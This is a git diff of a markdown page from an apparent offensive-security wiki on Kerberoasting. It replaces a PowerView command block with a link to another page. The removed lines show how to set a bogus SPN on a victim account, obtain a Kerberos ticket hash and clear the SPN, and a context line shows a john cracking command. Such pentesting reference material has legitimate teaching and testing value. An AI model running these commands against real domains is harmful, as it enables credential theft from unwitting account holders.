@@ -65,25 +65,7 @@ john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
 
 ### Targeted Kerberoasting
 
-If an attacker controls an account with the rights to add an SPN to another \([`GenericAll`](../abusing-aces.md#genericall), [`GenericWrite`](../abusing-aces.md#genericwrite)\), it can be abused to make that other account vulnerable to Kerberoast \(see [Abusing ACEs](../abusing-aces.md)\).
-
-This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).
-
-```bash
-# Make sur that the target account has no SPN
-Get-DomainUser victimuser | Select serviceprincipalname
-
-# Set the SPN
-Set-DomainObject -Identity victimuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
-
-# Obtain a kerberoast hash
-$User = Get-DomainUser victimuser 
-$User | Get-DomainSPNTicket | fl
-
-# Clear the SPNs of the target account
-$User | Select serviceprincipalname
-Set-DomainObject -Identity victimuser -Clear serviceprincipalname
-```
+If an attacker controls an account with the rights to add an SPN to another \([`GenericAll`](../abusing-aces/#genericall), [`GenericWrite`](../abusing-aces/#genericwrite)\), it can be abused to make that other account vulnerable to Kerberoast \(see [exploitation](../abusing-aces/targeted-kerberoasting.md)\).
 
 ## Resources
 
